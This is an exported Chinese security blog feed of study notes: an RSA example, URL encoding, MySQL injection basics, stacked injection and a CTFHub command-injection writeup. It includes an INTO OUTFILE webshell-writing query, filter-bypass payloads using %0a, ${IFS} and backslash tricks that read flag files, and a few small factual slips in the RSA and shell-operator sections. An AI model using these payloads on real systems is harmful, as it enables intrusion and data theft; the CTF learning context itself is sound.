title="实现过程"></a>实现过程</h4><p>取p=17,q=19,则N=323<br>则L=lcm(16,18)=144<br>∵1&lt;E&lt;L &amp;&amp; gcd(E,L)=1<br>∴ E=5<br>由1&lt;D&lt;L &amp;&amp; E<em>D mod L=1可得：7*D MOD 144 =1 -&gt; 5</em>D=145<em>n(n∈N</em>)（这里的N*代表正整数）<br>可得D=29<br>则：公钥对(E,N)=(5,323)<br>私钥对(D,N)=(29,323)<br>设原始消息M=233，经私钥加密后的密文=明文<sup>E</sup> mod N=275<br>解密过程中，明文=密文<sup>D</sup> mod N=233，还原成功。</p><h3 id="RSA工作过程"><a href="#RSA工作过程" class="headerlink" title="RSA工作过程"></a>RSA工作过程</h3><p>原始需要发送的消息为m<br>公钥加密方法为pubencode()<br>公钥解密方法为pubdecode()<br>公钥加密/解密得到的内容为pub(m)<br>私钥加密方法为priencode()<br>私钥解密方法为pridecode()<br>私钥加密/解密得到的内容为pri(m)<br>Client————————–transmitting ————Server<br>M1-&gt;priencode()-&gt;pri(M1)-&gt; …………..    pri(M1)-&gt;pubdecode()-&gt;M1<br>M2&lt;-pridecode()&lt;-pub(M2)&lt;- …………..    pub(M2)&lt;-pubencode()&lt;-M2</p><h3 id="SSH免密登陆"><a href="#SSH免密登陆" class="headerlink" title="SSH免密登陆"></a>SSH免密登陆</h3><h4 id="基于口令的验证"><a href="#基于口令的验证" class="headerlink" title="基于口令的验证"></a>基于口令的验证</h4><p><img src="/img/ssh.png"></p><h4 id="基于密钥的验证"><a href="#基于密钥的验证" class="headerlink" title="基于密钥的验证"></a>基于密钥的验证</h4><p>使用RSA的公钥、私钥机制可以实现ssh免密登录。<br><img src="/img/ssh.jpg"><br>工作流程：<br>1.client生成公钥，私钥，并且把公钥存储在server的authorized_keys文件里面<br>2.client发送连接请求，发送公钥<br>3.server如果发现client的公钥在authorized_keys文件里面的话，会生成一段随机字符串用公钥加密发送给client<br>4. client收到加密后的字符串后使用私钥解密，然后把解密后的字符串发给server<br>5.server验证字符串是否和发送的相等，相等的话则建立链接。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL编码解码</title>
      <link href="2020/03/26/URL%E7%BC%96%E7%A0%81/"/>
      <url>2020/03/26/URL%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="浮生日记"><a href="#浮生日记" class="headerlink" title="浮生日记"></a>浮生日记</h1><p>3.26 阴</p><h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><p>参考：<br><a href="https://blog.csdn.net/ljhabc1982/article/details/7094757">https://blog.csdn.net/ljhabc1982/article/details/7094757</a><br><a href="https://www.cnblogs.com/jerrysion/p/5522673.html">https://www.cnblogs.com/jerrysion/p/5522673.html</a><br><a href="https://www.cnblogs.com/mengff/p/7282488.html">https://www.cnblogs.com/mengff/p/7282488.html</a><br><a href="https://blog.csdn.net/danielzhou888/article/details/72861097">https://blog.csdn.net/danielzhou888/article/details/72861097</a><br>URL编码概念捞的不谈。<br>只有数字，大小写字母，特定的保留字才不会进行URL编码。</p><h2 id="Understanding-of-Content-Type"><a href="#Understanding-of-Content-Type" class="headerlink" title="Understanding of Content-Type"></a>Understanding of Content-Type</h2><p>在HTTP请求和响应投中用Content-Type来表示具体请求中的媒体类型信息。<br> 常见的媒体格式类型如下：</p><pre><code>text/html ： HTML格式text/plain ：纯文本格式      text/xml ：  XML格式image/gif ：gif图片格式    image/jpeg ：jpg图片格式 image/png：png图片格式</code></pre><p>   以application开头的媒体格式类型：</p><p>   application/xhtml+xml ：XHTML格式<br>   application/xml     ： XML数据格式<br>   application/atom+xml  ：Atom XML聚合格式<br>   application/json    ： JSON数据格式<br>   application/pdf       ：pdf格式<br>   application/msword  ： Word文档格式<br>   application/octet-stream ： 二进制流数据（如常见的文件下载）<br>   application/x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）<br>   multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</p><h2 id="get-post-of-form"><a href="#get-post-of-form" class="headerlink" title="get/post of form"></a>get/post of form</h2><p>如果enctype为默认的application/x-www-form-urlencoded时：<br>form的method为get时话，则把参数按照?k1=v1&amp;k2=v2的形式拼接到URL的后面直接访问。<br>firn的method为post的话，则把参数放以k1=v1&amp;k2=v2的形式到请求体里面。<br>在有 input type=file 时候，要用multipart/form-data编码方式。浏览器会把表单以控件为单位分割，每个部分使用 –boundary 分割开来，最后一行使用 –boundary– 结尾，<br>并且为每个部分加上Content-Dispositon(form-data或file)、Content-Type(默认text/plain)、<br>name(控件name)等信息，并加上分割符(boundary)。<br>举例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">通过form表单提交文件操作如下：</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;post&quot;action=&quot;http://w.sohu.com/t2/upload.do&quot; enctype=”multipart/form-data”&gt;</span><br><span class="line"></span><br><span class="line">         &lt;inputtype=&quot;text&quot; name=&quot;desc&quot;&gt;</span><br><span class="line"></span><br><span class="line">         &lt;inputtype=&quot;file&quot; name=&quot;pic&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">浏览器将会发送以下数据：</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/t2/upload.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>SOHUWapRebot</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-cn,zh;q=0.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Charset</span><span class="punctuation">: </span>GBK,utf-8;q=0.7,*;q=0.7</span><br><span class="line"></span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>60408</span><br><span class="line"></span><br><span class="line">Content-Type:multipart/form-data; boundary=ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>w.sohu.com</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data;name=&quot;desc&quot;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>8bit</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[......][......][......][......]...........................</span><br><span class="line"></span><br><span class="line">--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data;name=&quot;pic&quot;; filename=&quot;photo.jpg&quot;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>binary</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[图片二进制数据]</span><br><span class="line"></span><br><span class="line">--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC--</span><br></pre></td></tr></table></figure><h2 id="对URL编码的理解："><a href="#对URL编码的理解：" class="headerlink" title="对URL编码的理解："></a>对URL编码的理解：</h2><p>在浏览器发送请求前，如果发现传入的参数包括了除保留字和非保留字之外的字符，则需要进行URL编码，然后进行传输。<br>服务器接受到请求后会自动执行一次解码过程。<br>即：客户端发送请求前确保URL符合规范；否则进行URL编码；-&gt;传送到服务端默认进行一次URL解码；然后服务器端进行一次URL编码后发送给客户端-&gt;客户端进行URL解码并显示。<br>那么问题来了。如果我的请求参数中存在特殊符号，那么编码又是什么情况？<br>比如param1=admin+1<br>如果这样直接提交请求的话，浏览器检查通过，直接发送（因为+是保留字，被翻译成空格）<br>在bing搜索123%123 其实搜出来的是123 123<br><img src="/img/url3.jpg"><br>下图是输入编码后的数据%2b的情况：<br><img src="/img/url1.jpg"><br>下图是直接输入+的情况<br><img src="/img/url2.jpg"></p><h2 id="保留字符不用于URI分隔符，而是用于其它位置，比如参数的value时，要对这时用到的保留字符做URL编码。"><a href="#保留字符不用于URI分隔符，而是用于其它位置，比如参数的value时，要对这时用到的保留字符做URL编码。" class="headerlink" title="保留字符不用于URI分隔符，而是用于其它位置，比如参数的value时，要对这时用到的保留字符做URL编码。"></a>保留字符不用于URI分隔符，而是用于其它位置，比如参数的value时，要对这时用到的保留字符做URL编码。</h2><p>比如pa1=admin&amp;pa3 , pa2=123123<br>如果不对value中的保留字进行编码的话，则结果是这样的：pa1=admin&amp;pa3&amp;pa2=123123<br>可能存在安全隐患。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql注入基础&amp;Linux基础</title>
      <link href="2020/03/26/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>2020/03/26/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="致敬"><a href="#致敬" class="headerlink" title="致敬"></a>致敬</h1><p><a href="https://www.freebuf.com/column/201364.html">https://www.freebuf.com/column/201364.html</a></p><h2 id="basic-stucture-of-mysql-database"><a href="#basic-stucture-of-mysql-database" class="headerlink" title="basic stucture of mysql database"></a>basic stucture of mysql database</h2><p>mysql5内置系统数据库IFORMATION_SCHEMA，记录了数据库中所有的数据库名、数据库表名、数据库表字段名。<br>其中的关键表：<br>SCHEMATA，存储数据库名，关键字段：SCHEMA_NAME -&gt;数据库名称<br>例句:<br>select schema_name from INFORMATION_SCHEMA.SCHEMATA;</p><p>则查询到的是当前所有数据库的名称。<br>tables:存储表名<br>关键字段：TABLE_SCHEMA -&gt;表示该表名属于哪个数据库名<br>关键字段：TABLE_NAME -&gt;存储表的表名<br>例句</p><p>select table_name from INFORMATION_SCHEMA.tables ; //查询所有的表名<br>select table_name from INFORMATION_SCHEMA.tables where table_schema=’dvwa’; //查询dvwa数据库的表名<br>columns:存储列名<br>关键字段：TABLE_SCHEMA -&gt;该字段所属数据库名</p><p>关键字段：TABLE_NAME -&gt;存储所属表的名称</p><p>关键字段：COLUMN_NAME -&gt;该字段的名称<br>例句：</p><p>select column_name from INFORMATION_SCHEMA.columns where table_name=’users’ and table_schema=’dvwa’;//查找dvwa数据库中user表中所有字段<br>常用变量<br>Select database() 数据库名称<br>Select VERSION() 数据库版本信息<br>Select @@VERSION 数据库版本信息<br>Select @@GLOBAL.VERSION 数据库版本信<br>user() 系统用户和登录主机名<br>current_user() 当前登录用户和登录主机名<br>system_user() 数据库系统用户账户名称和登录主机名<br>session_user() 当前会话用户名和登录主机名</p><p>写一句话<br>select ‘’intooutfile ‘/var/www/html/dvwa/1.php’; //导出一句话木马</p><p>判断列数<br>order by n<br>如果order by n报错并且order by n-1返回结果，则列数为n-1</p><h2 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h2><p>find(待补充)<br>find / -name ‘fla‘ 查找所有包含fla的文件<br>find / -name flag 查找所有以flag命名的文件<br>-iname选项不区分大小写</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>cat flag.txt<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt</p><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>ls -l 列出文件详细信息，如权限 大小 所有者和所属组，修改时间等<br>ls -all / ll 显示隐藏文件、列出文件详细信息，如权限 大小 所有者和所属组，修改时间等<br>-rwxrw-r‐-1 root root 1213 Feb 2 09:39 abc<br>第一个-代表文件，d代表目录,l代表链接。<br>r 读 w写 x执行<br>三段分别对应用户、组、其他的权限。 root root 分别表示用户、用户所在的组</p><h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p>chmod u/g/o +/-/= r/w/x filename<br>chmod u+x 1.txt 当前user可执行1.txt<br>chmod 755 1.txt 对应权限：rwxr-xr-x</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wget&amp;curl</title>
      <link href="2020/03/23/wget-curl/"/>
      <url>2020/03/23/wget-curl/</url>
      
        <content type="html"><![CDATA[<h2 id="致敬"><a href="#致敬" class="headerlink" title="致敬"></a>致敬</h2><p><a href="https://www.cnblogs.com/duhuo/p/5695256.html">https://www.cnblogs.com/duhuo/p/5695256.html</a></p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>curl <a href="http://www.baidu.com/">www.baidu.com</a> （默认get方式访问<a href="http://www.baidu.com/">www.baidu.com</a> 并且将html代码回显）<br>curl <a href="http://www.baidu.com/">www.baidu.com</a> &gt;&gt; baidu.html 保存为baidu.html<br>curl -o 2.jpg <a href="http://www.baidu.com/1.jpg">www.baidu.com/1.jpg</a> 下载1.jpg并保存为2.jpg</p><h4 id="ftp下载："><a href="#ftp下载：" class="headerlink" title="ftp下载："></a>ftp下载：</h4><p>curl -o -u username:password <a href="ftp://www.baidu.com/">ftp://www.baidu.com</a></p><h4 id="ftp上传"><a href="#ftp上传" class="headerlink" title="ftp上传"></a>ftp上传</h4><p>curl -T todo.jpg -u username:password <a href="ftp://www.baidu.com/">ftp://www.baidu.com</a></p><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>wget命令用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p><h3 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h3><p>wget -i filelist.txt 会下载filelist.txt里面所有的文件。<br>wget -c <a href="http://www.baidu.com/iso.iso">www.baidu.com/iso.iso</a> 支持断点续传<br>wget -r -np <a href="http://www.baidu.com/pack/">www.baidu.com/pack/</a>  np表示不遍历父目录，nd表示不在本机重新创建目录结构<br>wget  -O filename <a href="http://www.baidu.com/1.php">www.baidu.com/1.php</a> 将文件命名为filename并保存</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git快速入门&amp;&amp;git泄露</title>
      <link href="2020/03/20/git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-git%E6%B3%84%E9%9C%B2/"/>
      <url>2020/03/20/git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-git%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="git学习链接"><a href="#git学习链接" class="headerlink" title="git学习链接:"></a>git学习链接:</h2><p><a href="https://learngitbranching.js.org/">https://learngitbranching.js.org/</a><br><a href="https://bingohuang.gitbooks.io/progit2/content/10-git-internals/sections/objects.html">https://bingohuang.gitbooks.io/progit2/content/10-git-internals/sections/objects.html</a><br><a href="https://zhuanlan.zhihu.com/p/44741777">https://zhuanlan.zhihu.com/p/44741777</a></p><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>原理：通过.git文件夹以及子目录、文件可以还原工程源代码。<br>过程：<br>1.解析.git/index文件，找到工程所有：（文件名，文件sha1）<br>2.去.git/objects/文件夹下载对应的文件<br>3.zlib解压文件，按原始的目录结构写入源代码<br>利用工具：GitHack</p><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>git stash 暂存当前没有完成的工作，当处理完bug后可以通过 git stash pop 将之前没做完的工作合并过来。所以可以通过 git stash pop 弹出之前尚未提交的文件<br>git reset –hard HEAD～1 (或是版本号)意为将版本库回退1个版本，但是不仅仅是将本地版本库的头指针全部重置到指定版本，也会重置暂存区，并且会将工作区代码也回退到这个版本<br>git diff hash 对比当前版本与hash版本提交的区别。<br>git checkout hash 切换到hash版本的提交中。/切换分支<br>git branch -a //show all branches</p><h3 id="针对练习"><a href="#针对练习" class="headerlink" title="针对练习"></a>针对练习</h3><p>练习平台：CTFHUB <a href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a><br>技能树-web-信息泄露-git</p>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆叠注入</title>
      <link href="2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>将原来的语句构造完后加上分号，代表该语句结束，后面再输入的就是新的sql语句。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>堆叠注入的使用条件有限。只有当调用数据库函数支持执行多条sql语句时才能够使用，比如php中的mysqli_multi_query()函数。<br>sql=”select * from flag where id=$_POST[‘id’]”;<br>则可构造:<br>1;select * from flag<br>练习题：BUUCTF [SUCTF 2019]EasySQL</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入绕过&amp;URL解析</title>
      <link href="2020/03/16/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-URL%E8%A7%A3%E6%9E%90/"/>
      <url>2020/03/16/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-URL%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="题目环境：ctfhub-综合命令注入"><a href="#题目环境：ctfhub-综合命令注入" class="headerlink" title="题目环境：ctfhub-综合命令注入"></a>题目环境：ctfhub-综合命令注入</h1><p>致敬、参考：<a href="https://blog.csdn.net/lusanshui/article/details/86492410?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task">回车&amp;换行</a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过阅读源码发现，过滤了| &amp; ; 空格 / cat flag ctfhub这几个关键字。不绕过的话根本日不进去。接下来考虑绕过<br>首先先ls一下看看里面有啥。想ls，首先要把分隔符绕过了才能ls。这里采用URL编码,即%0a代表换行符。尝试：<img src="/img/rc1.png"><br>成功。接下来我们需要做的是查看flag_is_here文件夹有啥。（或许不是文件夹）<br>这里由于过滤了flag字段和空格，所以可以采用fl\ag这种形式绕过flag，采用${IFS}绕过空格过滤。payload:ip=127.0.0.1%0als${IFS}fl\ag_is_here<br>之后得到结果flag_5145112918545.php。下一步就应该康康这里面有什么了。假设当前目录为/，我们需要读取/flag_is_here/flag_5145112918545.php文件的内容。<br>继续分析。由于过滤了路径分隔符\，考虑采用综合命令：先cd进入flag_is_here文件夹，然后cat flag_5145112918545.php文件，当然，针对cat的绕过有很多方法 比如ca\t 或者直接sort flag_5145112918545.php<br>payload:ip=127.0.0.1%0acd${IFS}fl\ag_is_here%0aca\t${IFS}fl\ag_5145112918545.php<br>或者把ca\t换成sort。一样</p><h2 id="注意内容：这里换行符需要注意。换行符的URL编码为-0a-采用GET方式。所以需要你直接使用GET方式提交数据，而不能在输入框输入数据。因为在输入框输入数据后，浏览器会自动进行一次urlencode-的过程，会把-0a再次url编码成别的。这就不是我们想要的了。所以可以用hackbar或者burp直接用get方式提交。"><a href="#注意内容：这里换行符需要注意。换行符的URL编码为-0a-采用GET方式。所以需要你直接使用GET方式提交数据，而不能在输入框输入数据。因为在输入框输入数据后，浏览器会自动进行一次urlencode-的过程，会把-0a再次url编码成别的。这就不是我们想要的了。所以可以用hackbar或者burp直接用get方式提交。" class="headerlink" title="注意内容：这里换行符需要注意。换行符的URL编码为%0a,采用GET方式。所以需要你直接使用GET方式提交数据，而不能在输入框输入数据。因为在输入框输入数据后，浏览器会自动进行一次urlencode()的过程，会把%0a再次url编码成别的。这就不是我们想要的了。所以可以用hackbar或者burp直接用get方式提交。"></a>注意内容：这里换行符需要注意。换行符的URL编码为%0a,采用GET方式。所以需要你直接使用GET方式提交数据，而不能在输入框输入数据。因为在输入框输入数据后，浏览器会自动进行一次urlencode()的过程，会把%0a再次url编码成别的。这就不是我们想要的了。所以可以用hackbar或者burp直接用get方式提交。</h2><h2 id="常见命令注入绕过姿势"><a href="#常见命令注入绕过姿势" class="headerlink" title="常见命令注入绕过姿势"></a>常见命令注入绕过姿势</h2><h3 id="先看致敬、参考链接中的回车-amp-换行。"><a href="#先看致敬、参考链接中的回车-amp-换行。" class="headerlink" title="先看致敬、参考链接中的回车&amp;换行。"></a>先看致敬、参考链接中的回车&amp;换行。</h3><p>command1 &amp;&amp; command2 cmd1成功执行后执行cmd2<br>command1 | command2 只执行command2<br>cmd1 || cmd2 cmd1不成功执行则执行cmd2<br>command1 &amp; command2 先执行command2后执行command1<br>空格绕过（以、为分界）：&lt;、&lt;&gt;、${IFS}、$IFS$9<br>$IFS 代表分隔符，$9代表当前系统shell进程中的第九个参数持有者，始终为空字符串。<br>比如：cat ${IFS}filename ===cat $IFS$9filename ===cat filenmae<br>;绕过：<br>首先要知道;代表连续指令，简单地说就是用;可以把多条指令写一行然后分别执行。<br>绕过方法：使用%0a编码绕过。<br>原理：<br>假设原命令为cmd1;cmd2;cmd3\n<br>使用%0a绕过后：cmd1%0acmd2%0acmd3%0a  ==&gt;cmd1\ncmd2\ncmd3\n 注意理解换行符的概念。就知道为什么这样可以绕过了。（粗暴的理解:一个\n就代表\n前面的命令执行一次）<br>黑名单字符绕过：<br>a=fl;b=ag;$a$b  -&gt;flag<br>cat ca\t -&gt;cat<br>或者用别的方法。比如可以用sort/head/tail/strings 替换cat<br>#URL解析全过程<br>什么是URL<br><a href="https://blog.csdn.net/simplebam/article/details/72644094">区分URL\URI</a><br>URL统一资源定位符，用于互联网上不同的资源的标识，就像不同的人有不同的身份证一样。<br>URL包括协议、域名、路径、参数、查询等。<br>比如：<a href="http://polosec.github.io/index.html">http://polosec.github.io/index.html</a></p><h3 id="URL编码规则"><a href="#URL编码规则" class="headerlink" title="URL编码规则"></a>URL编码规则</h3><p>Url编码通常也被称为百分号编码，编码方式非常简单，使用%百分号加上两位的字符——0123456789ABCDEF——代表一个字节的十六进制形式。Url编码默认使用的字符集是US-ASCII。例如a在US-ASCII码中对应的字节是0x61，那么Url编码之后得到的就是%61，我们在地址栏上输入 <a href="http://g.cn/search?q=abc">http://g.cn/search?q=%61%62%63</a> ，实际上就等同于在google上搜索abc了。又如@符号在ASCII字符集中对应的字节为0x40，经过Url编码之后得到的是%40。<br>对于非ASCII字符，需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。对于Unicode字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。如”中文”使用UTF-8字符集得到的字节为0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过Url编码之后得到”%E4%B8%AD%E6%96%87”。</p><h3 id="URL编码-解码时间节点"><a href="#URL编码-解码时间节点" class="headerlink" title="URL编码/解码时间节点"></a>URL编码/解码时间节点</h3><p>发送请求的时候客户端会自动编码，服务器端接受到请求后会自动解码；然后编码发送给客户端；客户端再解码。<br>关于二次编码/二次解码的问题：<a href="https://www.cnblogs.com/xzwblog/p/6932870.html">二次编码&amp;二次解码</a>用来解决中文编码后乱码的问题</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>输入URL按回车后，首先进行的是域名解析操作。首先查看缓存：依次查找浏览器内部缓存、本机hosts文件、本地路由器缓存、然后是ISP提供商的缓存。<br>如果缓存都没有的话，则本地DNS服务器向根域名服务器进行迭代查询，查询到结果后返回给主机。<a href="https://www.cnblogs.com/qingdaofu/p/7399670.html">递归查询、迭代查询</a></p><h2 id="进行TCP连接-三次握手"><a href="#进行TCP连接-三次握手" class="headerlink" title="进行TCP连接(三次握手)"></a>进行TCP连接(三次握手)</h2><p>获取到服务器IP地址后，浏览器会以一个随机端口向服务器的80(默认)端口发起TCP连接请求。</p><h2 id="客户端发送HTTP请求"><a href="#客户端发送HTTP请求" class="headerlink" title="客户端发送HTTP请求"></a>客户端发送HTTP请求</h2><p>建立连接后，浏览器发送一个HTTP请求。请求包含请求头和请求正文。请求头一般包括请求方法，资源路径，HTTP协议版本、cookie、host、accept等字段。请求正文则是客户端发送的信息。</p><h2 id="服务器响应HTTP请求"><a href="#服务器响应HTTP请求" class="headerlink" title="服务器响应HTTP请求"></a>服务器响应HTTP请求</h2><p>HTTP响应包括了状态行、响应头、响应正文。<br>状态行标识了http协议版本与状态码。<br>响应头包含了一些字段。比如set-cookie,date,allow,content-encoding等字段。以K:V形式出现。</p><h2 id="浏览器显示html页面"><a href="#浏览器显示html页面" class="headerlink" title="浏览器显示html页面"></a>浏览器显示html页面</h2><p>1.加载解析HTML，开始构建DOM树。<br>2.遇到CSS外链，异步加载解析CSS，构建CSS规则树。<br>3.遇到script标签，如果是普通JS标签则同步加载并执行，阻塞页面渲染，如果标签上有defer/async属性则异步加载JS资源。设置defer的JS资源会在DOMContentLoaded事件之前执行；设置了async的JS资源加载完就执行。<br>4.合并DOM树和CSS规则树生成render树。<br>5.布局render树，计算各元素的尺寸、位置等，在内存上生成Bitmap。<br>6.渲染render树，将内存上的Bitmap绘制到屏幕上。</p><h2 id="页面加载完成"><a href="#页面加载完成" class="headerlink" title="页面加载完成"></a>页面加载完成</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu登录流量分析</title>
      <link href="2020/03/14/buu%E7%99%BB%E5%BD%95%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
